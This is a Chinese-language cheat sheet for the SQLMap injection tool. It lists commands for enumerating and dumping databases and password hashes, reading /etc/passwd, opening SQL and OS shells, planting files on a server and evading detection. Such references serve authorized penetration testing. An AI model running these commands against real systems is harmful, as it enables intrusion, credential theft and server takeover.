# SQLMap
[TOC]

## 简介
自动化检测和利用 SQL 注入漏洞。它支持多种数据库管理系统，提供指纹识别、数据提取、文件访问和命令执行等功能。

## 用法
### 基本用法
```bash
sqlmap -u target
```

### 信息获取
```bash
# 枚举数据库
sqlmap -u target --dbs --batch

# 枚举表
sqlmap -u target -D database --tables --batch

# 枚举列
sqlmap -u target -D database -T table --columns --batch

# 导出数据
sqlmap -u target -D database -T table --dump --batch
```

### 系统控制
```bash
# 获取 SQL shell
sqlmap -u target --sql-shell

# 获取操作系统 shell
sqlmap -u target --os-shell
```

### 文件读写
```bash
# 读取服务器文件
sqlmap -u target --file-read /etc/passwd

# 将本地文件写入服务器（挂马等）
sqlmap -u target --file-write /local/file --file-dest /remote/file
```

### 模式控制
```bash
# 隐身模式
sqlmap -u target --delay 3 \
    --safe-url target/safe --safe-freq 10 \
    --random-agent --randomize=param \

# 侵略性模式
sqlmap -u target --level 5 --risk 3 --threads 10
```

### 傻瓜式
```bash
# 向导模式
sqlmap --wizard

# 图形界面
sqlmap --gui

# 文本界面
sqlmap --tui
```

## 参数
### 目标指定
- `-u <url>`: 指定目标 URL，可含参

- `-m <file>`: 指定 URL 文件，每行一个 URL

- `-r <file>`: 指定请求文件，包含完整 HTTP 请求

- `--test-param <parameter>`: 指定测试参数（默认全部）

### HTTP 请求指定
- `--method <method>`: 指定请求方法（默认 GET）

- `-H / --headers <header>`: 添加 HTTP 头

- `-A / --user-agent <agent>`: 指定 User-Agent

- `--referrer <referer>`: 指定 Referer

- `--data <data>`: 指定 POST 数据

- `--cookie <data>`: 指定 Cookie 数据

### 探测控制
- `--level <1-5>`: 指定测试级别（默认 1）控制广度
    | Level | 注入位置 |
    |-------|-------------|
    | **1** | GET/POST 参数 |
    | **2** | +Cookie 值 |
    | **3** | +User-Agent、Referer |
    | **4** | +Host Header |
    | **5** | 所有 HTTP Header |
    >[!WARNING] 注意
    level 越高发包量越大，容易被发现。level 3 足够覆盖大多数场景。

- `--risk <1-3>`: 指定测试风险（默认 1）控制深度
    | Risk | 风险 | 内容 |
    |------|-----|-----|
    | **1** | 无影响 | SELECT-based 搜索 |
    | **2** | 影响性能或日志 | 基于事件的时间盲注、堆叠等|
    | **3** | 改动或破坏数据 | OR-based，复杂堆叠|

- `--technique <tech>`: 指定注入技术（默认全部）
    | Technique | 描述 |
    |-----------|-----|
    | **B** | 布尔盲注 |
    | **T** | 时间盲注 |
    | **E** | 报错注入 |
    | **U** | 联合查询 |
    | **S** | 堆叠注入 |
    | **Q** | 内联查询 |

### 数据获取
#### 信息指定
- `--dbs`: 获取所有数据库

- `--tables`: 获取所有表

- `--columns`: 获取所有列

- `--schema`: 获取完整数据库结构

- `--users`: 获取所有用户

- `--passwords`: 获取所有密码哈希

#### 目标指定
- `-D <db>`: 指定数据库

- `-T <table>`: 指定表

- `-C <column>`: 指定列

- `-U <user>`: 指定用户

#### 输出控制
- `--dump`: 导出数据

- `--dump-all`: 导出所有数据

- `--dump-format <format>`: 指定导出格式（csv, json, html...）

- `--start <index>`: 指定导出起始行

- `--stop <index>`: 指定导出结束行

### 命令执行
#### 文件操作
- `--file-read <path>`: 读取服务器文件

- `--file-write <path>`: 将本地文件写入服务器

- `--file-dest <path>`: 指定写入服务器的路径

#### 系统操控
- `--sql-shell`: 获取交互式 SQL shell

- `--os-cmd <command>`: 执行系统命令

- `--os-shell`: 获取交互式操作系统 shell

- `--os-pwn`: 获取 Meterpreter、VNC 等高级 shell

### 性能与隐蔽性
- `--threads <num>`: 指定线程数（默认 1）

- `--delay <sec>`: 指定多次请求之间的延迟（默认 0）

- `--randomize <param>`: 随机化指定参数的值

- `--random-agent`: 随机化 User-Agent

- `--safe-url <url>`: 指定安全 URL，定期访问减少嫌疑

- `--safe-freq <num>`: 访问安全 URL 的频率

### 交互选项
- `-v <0-6>`: 指定详细级别（默认 1）

- `-hh`: 显示帮助信息
  
- `--batch`: 自动选择默认选项，避免交互

- `--tui`: 启用文本用户界面

- `--gui`: 启用图形用户界面

- `--wizard`: 启用向导模式，引导用户逐步配置

